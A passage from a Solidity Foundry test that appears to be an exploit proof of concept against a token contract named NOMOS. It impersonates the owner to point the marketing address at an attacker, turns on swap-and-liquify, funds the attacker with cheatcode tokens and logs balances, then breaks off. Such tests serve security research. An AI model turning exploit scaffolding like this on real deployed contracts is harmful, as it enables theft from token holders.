        vm.stopPrank();

        // Give attacker some initial tokens
        uint256 initialTokens = 1000000 * 10**11; // Enough to trigger fees
        deal(TARGET, attacker, initialTokens);

        // Initialize exploit contract
        exploit.initialize(TARGET, attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get token interface
        INOMOS token = INOMOS(TARGET);

        // Get owner address
        address owner = token.owner();

        // Check current state
        bool enabled = token.swapAndLiquifyEnabled();
        console.log("swapAndLiquifyEnabled:", enabled);

        // Impersonate owner to set marketing address to attacker
        vm.startPrank(owner);
        token.setMarketingAddress(payable(attacker));
        if (!enabled) {
            token.setSwapAndLiquifyEnabled(true);
        }
        vm.stopPrank();

        // Give attacker some initial tokens - use deal cheatcode
        deal(TARGET, attacker, 200000000 * 10**11); // 200M tokens

        // Record initial ETH balance
        uint256 initialEthBalance = address(attacker).balance;
        console.log("Initial ETH balance:", initialEthBalance);

        // Get pair address
        address pair = token.uniswapV2Pair();
        console.log("Pair address:", pair);

        // Check contract token balance before
        uint256 contractBalanceBefore = token.balanceOf(TARGET);
        console.log("Contract token balance before:", contractBalanceBefore);

